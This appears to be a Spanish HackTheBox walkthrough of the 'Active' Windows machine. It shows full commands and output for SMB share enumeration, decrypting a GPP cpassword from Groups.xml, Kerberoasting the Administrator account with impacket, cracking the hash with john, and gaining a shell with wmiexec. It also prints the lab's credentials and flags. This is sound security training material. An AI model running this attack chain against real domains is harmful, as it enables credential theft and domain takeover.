---
title: Active | Windows
published: 2025-09-06
image: "./logo.png"
tags: [Easy, Windows, SMB Enum, Abusing GPP Passwords, gpp-decrypt, Kerberoastin Attack, GetUserSPNs.py, OSCP, OSEP, eCPPTv3, Active Directory]
category: HackTheBox
---

## Información Básica

### Técnicas vistas

- SMB Enumeration
- Abusing GPP Passwords
- Decrypting GPP Passwords - gpp-decrypt
- Kerberoasting Attack (GetUserSPNs.py) [Privilege Escalation]

### Preparación

- OSCP
- OSEP
- eCPPTv3
- Active Directory

***

## Reconocimiento

### Nmap

Iniciaremos el escaneo de **Nmap** con la siguiente línea de comandos:

```bash wrap=false
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.100 -oG nmap/allPorts 
```

| Parámetro           | Descripción                                                                                  |
| ------------------- | -------------------------------------------------------------------------------------------- |
| `-p-`               | Escanea **todos los puertos** (1-65535).                                                     |
| `--open`            | Muestra **solo puertos abiertos**.                                                           |
| `-sS`               | Escaneo **SYN** (rápido y sigiloso).                                                         |
| `--min-rate 5000`   | Envía al menos **5000 paquetes por segundo** para acelerar el escaneo.                       |
| `-vvv`              | Máxima **verbosidad**, muestra más detalles en tiempo real.                                  |
| `-n`                | Evita resolución DNS.                                                                        |
| `-Pn`               | Asume que el host está activo, **sin hacer ping** previo.                                    |
| `10.10.10.100`      | Dirección IP objetivo.                                                                       |
| `-oG nmap/allPorts` | Guarda la salida en formato **grepable** para procesar con herramientas como `grep` o `awk`. |

```txt wrap=false
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5722/tcp  open  msdfsr           syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49152/tcp open  unknown          syn-ack ttl 127
49153/tcp open  unknown          syn-ack ttl 127
49154/tcp open  unknown          syn-ack ttl 127
49155/tcp open  unknown          syn-ack ttl 127
49157/tcp open  unknown          syn-ack ttl 127
49158/tcp open  unknown          syn-ack ttl 127
49165/tcp open  unknown          syn-ack ttl 127
49166/tcp open  unknown          syn-ack ttl 127
49173/tcp open  unknown          syn-ack ttl 127
```

Ahora con la función **extractPorts**, extraeremos los puertos abiertos y nos los copiaremos al clipboard para hacer un escaneo más profundo:

```bash title="Función de S4vitar"
extractPorts () {
	ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')" 
	ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)" 
	echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
	echo -e "\t[*] IP Address: $ip_address" >> extractPorts.tmp
	echo -e "\t[*] Open ports: $ports\n" >> extractPorts.tmp
	echo $ports | tr -d '\n' | xclip -sel clip
	echo -e "[*] Ports copied to clipboard\n" >> extractPorts.tmp
	/bin/batcat --paging=never extractPorts.tmp
	rm extractPorts.tmp
}
```

```bash wrap=false
nmap -sVC -p53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,49152,49153,49154,49155,49157,49158,49165,49166,49173 10.10.10.100 -oN nmap/targeted
```

| Parámetro           | Descripción                                                                          |
| ------------------- | ------------------------------------------------------------------------------------ |
| `-sV`               | Detecta la **versión** de los servicios que están corriendo en los puertos abiertos. |
| `-C`                | Ejecuta **scripts NSE de detección de versiones y configuración**.                   |
| `-p`                | Escanea únicamente los puertos seleccionados.                                        |
| `10.10.10.100`      | Dirección IP objetivo.                                                               |
| `-oN nmap/targeted` | Guarda la salida en **formato normal** en el archivo indicado.                       |

```txt wrap=false
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-06 21:16:16Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
49166/tcp open  msrpc         Microsoft Windows RPC
49173/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-09-06T21:17:16
|_  start_date: 2025-09-06T21:12:06
```

### SMB Enum

Viendo que están ambos puertos de `SMB` abiertos, empezaremos reconociendo por ahí:

```bash wrap=false
❯ smbmap -H 10.10.10.100
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 10.10.10.100:445	Name: 10.10.10.100        	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	NO ACCESS	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	Replication                                       	READ ONLY	
	SYSVOL                                            	NO ACCESS	Logon server share 
	Users                                             	NO ACCESS	
[*] Closed 1 connections
```

Tenemos acceso a `Replication`, vamos a ver que hay:

```bash wrap=false
❯ smbclient //10.10.10.100/Replication

Password for [WORKGROUP\zelpro]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 21 12:37:44 2018
  ..                                  D        0  Sat Jul 21 12:37:44 2018
  active.htb                          D        0  Sat Jul 21 12:37:44 2018

		5217023 blocks of size 4096. 235891 blocks available
```

### Getting Groups.xml

Investigando todos los directorios después de añadir ese dominio a `/etc/hosts`, podemos ver lo siguiente:

```bash wrap=false
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> ls
  .                                   D        0  Sat Jul 21 12:37:44 2018
  ..                                  D        0  Sat Jul 21 12:37:44 2018
  Groups.xml                          A      533  Wed Jul 18 22:46:06 2018

		5217023 blocks of size 4096. 299925 blocks available
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> get Groups.xml 
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as Groups.xml (3,2 KiloBytes/sec) (average 3,2 KiloBytes/sec)
```

:::note
Esa ruta viene de:
\active.htb           → dominio
    Policies          → todas las GPOs
        {GUID}        → GPO específica
            MACHINE   → configuración de máquinas
                Preferences → Group Policy Preferences
                    Groups → usuarios/grupos definidos (donde puede estar cpassword)
:::

:::important
Una GPO (Group Policy Object) es básicamente un conjunto de reglas y configuraciones que un administrador aplica en un dominio de Active Directory.

Controla qué pueden hacer los usuarios y equipos: contraseñas, permisos, scripts, configuración de red, políticas de escritorio, etc.

Se aplica a usuarios (USER) o equipos (MACHINE).

Cada GPO tiene un GUID único y suele almacenarse en el share de replicación (SYSVOL) del dominio.

Las Preferences dentro de una GPO pueden definir cosas “opcionales” como cuentas de servicio o tareas programadas, y a veces contienen el cpassword que permite obtener credenciales.
:::

Sabiendo esto, vemos el contenido de `Groups.xml`:

```xml wrap=false
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
<User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}">
<Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/>
</User>
</Groups>
```

### Decrypting GPP Passwords (gpp-decrypt)

Vemos el campo `cpassword` que vale `edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ`, esta es la contraseña encriptada de **SVC_TGS**, que se desencripta con la siguiente herramienta:

```bash wrap=false
❯ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```

## Escalada de privilegios

### impacket-GetUserSPNs (Kerberoasting)

Perfecto, pues ya tenemos credenciales `SVC_TGS:GPPstillStandingStrong2k18`. Con ´impacket-GetUserSPNs´ vamos a ver **SPNs** vulnerables a `Kerberoasting`:

```bash wrap=false
❯ impacket-GetUserSPNs active.htb/SVC_TGS:'GPPstillStandingStrong2k18' -dc-ip 10.10.10.100

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 21:06:40.351723  2025-09-06 23:13:22.875371             
```

:::important
Enumera los SPNs (Service Principal Names) del dominio.
- SPN: identificador único de un servicio en Active Directory (ej: CIFS/Servidor).
- Muestra que la cuenta Administrator tiene un SPN → vulnerable a Kerberoasting.
:::

```bash wrap=false
❯ impacket-GetUserSPNs active.htb/SVC_TGS:'GPPstillStandingStrong2k18' -dc-ip 10.10.10.100 -request

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 21:06:40.351723  2025-09-06 23:13:22.875371             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$9e7c588fce097403cab14d6bb69c0bdd$3dae9827a49de2af8d2b0125e90fc2addf8de04380a848706f893e2a7d2664808d17b0cfcbad367f25dc235e68a25ad3ee0ada6b2748cd8f20c8a5d6aa407f6f4a99e7d6ff820c7b60e16109680a248a24824cc46a8d66c7395b567d128ab0cc2937cf7711377a2eed622d305d391ceab48fb0e0f7652878c6b51ef513af9f358890c7b3e480bbe2173c064849a89a2f0f4e59d3966163f440d3e1e5731e2db81092b879eb0e4975a03859d60617b95174699dba9b4edefa7b971a3a624ce4f3bb82100d08b04a54d8a941175bafec38df8fcd7c892957dd8f1ff91a6b0cf8442602e645340d269d74f34c3051771d64f8ae469d7f2b83f11f4e1635e9a45e51fa4a1d1a7552eb209d145f1f6a05a6187710ff3b1bb45ba6375a4f3ebe2adacab7fc1a4eae7ab05939146d5e27b891795d0a5b0614486094ada0b69ba79b65c1c15b1b5f6692239dcd595e8247af7f2ca75413f2374a7173af8f02dc5bfd42c9bc3c170addbcdb0eb93f4cad9149a9cef8b103dfce1983172e64b7addc5a93c1351d4047520e083b9711854dbf18a5c797e08bad83007f23d8ef0b4f9c3eac4f92dce8f22ba426f47fcbcc758e1688da01d836c54675f06ba4107a6925072bfc5e67af9f1a49cb4f0420e5ffc676e78d3a780e6643f1b3d985154444bcc66eee12ea1d8a736c2d42199f6fd8bb250ee73a991220d351d749f624b7c77851b8519ab9dac0ebef85b16ce2aca336cd40bc79b4f0362615655c4640bf0768ef11c9ae438e0ab0775ca985388acf1ae9f4e2971212b87db5dbc12182f96bc02e04a660591fa20d5054228cdb10c0dbba94a422a2319d5f83039469137c607f9aedac9fc521dc6679ded619aecfc9d0e56c16dc90b82358c24b3fcab7935de185b1abd41a379e19cd5db75c1bea45a5af7f93a128f069ab43a7299b911e252e530e43e037de8bd56c051153edbbd1fb72ff4ea638c76ab1c90616945b6e39b8876d23dee8e65306aa43c684171392c525b43459a44f1dea270c73edb11105978f95c84d71e60f4905732322b9d50b21309398aece187924c4384434fb030a865a6b13ad3fb05d95aa4edd73459c300daf5ed0472d3cc0e70d20bfccf801033cbb65ce95e6445d7395c96989da1b7a9b758b523ff6af02deaafe78fe2274ba1b38f334c12e7ee4bb53d6cd4c439c1f7481111006e5ed61098eab3ec970f44274f4d84fdb9ea51eec4b6b71ddfbebfad455505fd15e1280b9cb188dbf01
```

:::important
Solicita un TGS (Ticket Granting Service) para cada SPN.
- TGS: ticket Kerberos que permite autenticar al servicio sin saber la contraseña.
- Genera un hash crackeable ($krb5tgs$...) que puedes pasar a hashcat/john para obtener la contraseña de Administrator.
:::

### Hash cracking

Teniendo ese **hash** simplemente lo crackearemos con `john the ripper`:

```bash wrap=false
❯ john --wordlist=/usr/share/wordlists/rockyou.txt adminhash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ticketmaster1968 (?)     
1g 0:00:00:06 DONE (2025-09-06 23:30) 0.1519g/s 1601Kp/s 1601Kc/s 1601KC/s Tiffani1432..Thrash1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Ahora con las credenciales `Administrator:Ticketmaster1968` nos conectaremos mediante `impacket-wmiexec` o `impacket-psexec`:

```bash wrap=false
❯ impacket-wmiexec active.htb/Administrator:'Ticketmaster1968'@10.10.10.100

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv2.1 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
active\administrator

C:\Users\SVC_TGS\Desktop>type user.txt
dd63ac70f0b478f794425e84ff4103a1

C:\Users\Administrator\Desktop>type root.txt
cc933aae7e62d5a57b5f26f0bab0f5da
```

[Pwned!](https://labs.hackthebox.com/achievement/machine/1992274/148)

---